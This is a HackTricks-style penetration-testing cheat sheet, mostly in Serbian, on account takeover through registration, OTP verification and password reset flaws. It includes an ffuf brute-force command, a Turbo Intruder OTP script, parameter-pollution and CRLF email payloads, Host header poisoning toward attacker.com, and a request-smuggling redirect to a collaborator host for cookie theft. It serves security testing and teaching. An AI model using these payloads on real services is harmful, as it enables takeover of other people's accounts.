# Ranljivosti pri registraciji i preuzimanju naloga

{{#include ../banners/hacktricks-training.md}}

## Preuzimanje naloga pri registraciji

### Dupla registracija

- Pokušajte da kreirate koristeći postojeći username
- Proverite varijacije email adrese:
- velika slova
- +1@
- dodajte tačku u email
- specijalni karakteri u delu imena email-a (%00, %09, %20)
- Stavite blank karaktere nakon email-a: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Isprobajte trikove email provajdera u vezi canonicalization (zavisno od servisa):
- Gmail ignoriše tačke i subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` stiže na `victim@gmail.com`
- Neki provajderi su case-insensitive u local-partu
- Neki provajderi prihvataju unicode confusables. Isprobajte homoglife i soft hyphen `\u00AD` u local-partu
- Iskoristite ovo da: zaobiđete provere jedinstvenosti, dobijete duple naloge/workspace invite-ove, ili blokirate victim sign‑ups (privremeni DoS) dok pripremate takeover

### Enumeracija username-a

Proverite da li možete da utvrdite kada je username već registrovan u aplikaciji.

- Različite poruke o grešci ili HTTP status kodovi
- Razlike u vremenu odgovora (postojeći user može da pokrene lookup na IdP/DB)
- Autofill polja registracije profila za poznate email-ove
- Proverite team/invite tokove: unošenje email-a može otkriti da li nalog postoji

### Politika password-a

Prilikom kreiranja korisnika proverite password policy (proverite da li možete koristiti slabe password-e).\
U tom slučaju možete pokušati da bruteforce-ujete kredencijale.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)da naučite kako pokušati preuzimanje naloga ili izvući informacije putem **SQL Injections** u registracionim formama.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML ranljivosti


{{#ref}}
saml-attacks/
{{#endref}}

### Promena email-a

Kada ste registrovani pokušajte da promenite email i proverite da li je ta promena pravilno validirana ili možete da je promenite na proizvoljan email.

### Dodatne provere

- Proverite da li možete koristiti **disposable emails** (mailinator, yopmail, 1secmail, itd.) ili zaobići blocklist pomoću subaddressing-a kao `victim+mailinator@gmail.com`
- Dugačak password (>200) dovodi do **DoS**
- **Proverite rate limits za kreiranje naloga**
- Koristite username@**burp_collab**.net i analizirajte **callback**
- Ako se koristi verifikacija telefona, proverite edge case-ove parsiranja/injekcije telefonskog broja

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Slaba verifikacija Email/Phone (OTP/Magic Link)

Registracioni tokovi često verifikuju vlasništvo preko numeričkog OTP-a ili magic-link tokena. Tipične slabosti:

- Pogodljiv ili kratak OTP (4–6 cifara) bez efektivnog rate limiting-a ili praćenja IP/device. Pokušajte paralelne pokušaje i rotaciju header/IP.
- OTP koji se može ponovo koristiti za različite akcije ili naloge, ili nije vezan za konkretnog korisnika/akciju (npr. isti kod radi za login i signup, ili radi nakon promene email-a).
- Multi-value smuggling: neki backendi prihvataju više kodova i verifikuju ako bilo koji odgovara. Pokušajte:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mešovita imena parametara: `otp=000000&one_time_code=123456`
- Vrednosti razdvojene zarezom/pipe-om: `code=000000,123456` ili `code=000000|123456`
- Response oracle: razlikovanje wrong vs expired vs wrong-user kodova po statusu/poruci/dužini body-ja.
- Tokeni koji se ne invalidiraju nakon uspeha ili nakon promene password-a/email-a.
- Verification token koji nije vezan za user agent/IP što omogućava cross-origin završetak verifikacije sa napadačem kontrolisane stranice.

Bruteforcing primer sa ffuf protiv JSON OTP endpoint-a:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Paralelno/konkurentno pogađanje za zaobilaženje sekvencijalnih zaključavanja (koristite Turbo Intruder u Burp):

<details>
<summary>Turbo Intruder primer za slanje velikog broja pokušaja 6-cifrenih OTP kodova</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Snažna klasa problema se javlja kada attacker izvrši radnje na victim-ovom emailu pre nego što victim kreira svoj nalog, a zatim kasnije ponovo stekne pristup.

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
  - Attacker: registruje classic nalog sa victim email-om i postavlja lozinku
  - Victim: kasnije se prijavljuje preko SSO (isti email)
  - Insecure merges may leave both parties logged in or resurrect the attacker’s access
- Unexpired Session Identifier
  - Attacker: kreira nalog i održava long‑lived session (ne odjavljuje se)
  - Victim: recovery/sets password i počinje da koristi nalog
  - Test if old sessions stay valid after reset or MFA enablement
- Trojan Identifier
  - Attacker: dodaje sekundarni identifier na pred‑kreirani nalog (telefon, dodatni email, ili povezuje attacker-ov IdP)
  - Victim: resetuje lozinku; attacker kasnije koristi trojan identifier za reset/login
- Unexpired Email Change
  - Attacker: inicira email‑change na attacker mail i zadržava potvrdu
  - Victim: oporavi nalog i počinje da ga koristi
  - Attacker: kasnije kompletira pending email‑change da ukrade nalog
- Non‑Verifying IdP
  - Attacker: koristi IdP koji ne verifikuje ownership email-a da bi tvrdio `victim@…`
  - Victim: registruje se preko classic route
  - Service merges on email without checking `email_verified` or performing local verification

Praktični saveti

- Harvest flows and endpoints iz web/mobile bundle-ova. Tražite classic signup, SSO linking, email/phone change i password reset endpoint-e.
- Napravite realističnu automatizaciju da održite sesije aktivnim dok testirate druge flow-ove.
- Za SSO testove, podignite test OIDC provider i izdajite tokene sa `email` claims za victim adresu i `email_verified=false` da proverite da li RP veruje unverified IdP-ovima.
- Nakon bilo kog password reset-a ili email change-a, proverite da li:
  - svi ostali sessions i tokeni su invalidirani,
  - pending email/phone change mogućnosti su otkazane,
  - prethodno povezani IdP-ovi/emails/phones su ponovo verifikovani.

Napomena: Opsežna metodologija i studije slučaja ovih tehnika su dokumentovane u Microsoft‑ovom pre‑hijacking istraživanju (pogledati References na kraju).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Zatražite password reset na vašu email adresu
2. Kliknite na password reset link
3. Ne menjajte lozinku
4. Kliknite na bilo koji 3rd party sajt (npr. Facebook, Twitter)
5. Presretnite zahtev u Burp Suite proxy-ju
6. Proverite da li referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Presretnite password reset zahtev u Burp Suite
2. Dodajte ili izmenite sledeće header-e u Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Prosledite zahtev sa izmenjenim header-om\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Potražite password reset URL baziran na _host header_-u, npr: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Napadač mora da se prijavi svojim nalogom i otvori funkciju **Change password**.
2. Pokrenite Burp Suite i presretnite zahtev
3. Pošaljite u Repeater tab i izmenite parametre : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Password reset token treba da bude nasumično generisan i jedinstven svaki put.\
Pokušajte da utvrdite da li token expire ili if it’s always the same, u nekim slučajevima generation algorithm je weak i može se pogoditi. Sledeće varijable mogu biti korišćene od strane algoritma.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request koristeći API/UI za određenu email adresu npr: test@mail.com
2. Pregledajte odgovor servera i proverite za `resetToken`
3. Zatim iskoristite token u URL-u kao `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registrujte se na sistem sa korisničkim imenom identičnim korisničkom imenu žrtve, ali sa razmacima ubačenim pre i/ili posle korisničkog imena. e.g: `"admin "`
2. Zatražite password reset sa vašim malicioznim korisničkim imenom.
3. Iskoristite token poslat na vaš email i resetujte lozinku žrtve.
4. Prijavite se na nalog žrtve koristeći novu lozinku.

Platforma CTFd je bila ranjiva na ovaj napad.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Pronađite XSS unutar aplikacije ili na poddomeni ako su cookies scoped na parent domain : `*.domain.com`
2. Leak trenutni **sessions cookie**
3. Autentifikujte se kao korisnik koristeći cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Koristite **smuggler** da detektujete tip HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Kreirajte zahtev koji će prepisati `POST / HTTP/1.1` sa sledećim podacima:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` sa ciljem da se izvrši open redirect žrtava na burpcollab i ukradu njihove cookies\
3. Finalni zahtev može izgledati ovako
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone izveštaji koji prikazuju iskorišćavanje ovog buga\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Preuzimanje naloga putem CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Napravite payload za CSRF, npr: “HTML form with auto submit for a password change”
2. Pošaljite payload

### Preuzimanje naloga putem JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token može biti korišćen za autentifikaciju korisnika.

- Izmenite JWT koristeći drugi User ID / Email
- Proverite da li je JWT potpis slab


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert na postojeću email adresu)

Neki signup handleri izvršavaju upsert kada prosleđeni email već postoji. Ako endpoint prihvata minimalan body sa email-om i password-om i ne primenjuje verifikaciju vlasništva, slanje email-a žrtve će prepisati njihovu lozinku pre autentifikacije.

- Discovery: prikupite imena endpointa iz bundled JS (ili mobile app traffic), zatim fuzz-ujte base paths kao /parents/application/v4/admin/FUZZ koristeći ffuf/dirsearch.
- Method hints: a GET returning messages like "Only POST request is allowed." često ukazuje na ispravan verb i da se očekuje JSON body.
- Minimal body observed in the wild:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Primer PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Uticaj: Potpuno preuzimanje naloga (ATO) bez ikakvog reset tokena, OTP-a ili verifikacije putem email-a.

## Reference

- [Kako sam pronašao kritičnu grešku za reset lozinke (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking napadi na web korisničke naloge (maj 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
